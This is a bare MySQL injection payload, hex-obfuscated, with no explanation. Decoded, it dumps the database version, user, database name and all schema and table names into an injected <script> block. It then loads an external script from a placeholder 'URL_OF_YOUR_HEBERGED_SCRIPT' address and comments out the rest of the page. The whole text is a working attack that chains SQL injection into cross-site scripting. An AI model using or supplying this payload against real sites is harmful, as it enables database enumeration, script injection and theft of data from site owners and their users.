concat(0x3c7363726970743e0a7661722064625f76657273696f6e203d2027,version(),0x273b0a7661722064625f75736572203d2027,user(),0x273b0a7661722063757272656e745f6462203d2027,database(),0x273b0a766172206f7074696f6e735f76616c7565203d2027,concat((select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x)),0x273b0a3c2f7363726970743e0a3c736372697074207372633d22,'URL_OF_YOUR_HEBERGED_SCRIPT',0x223e3c2f7363726970743e3c212d2d)
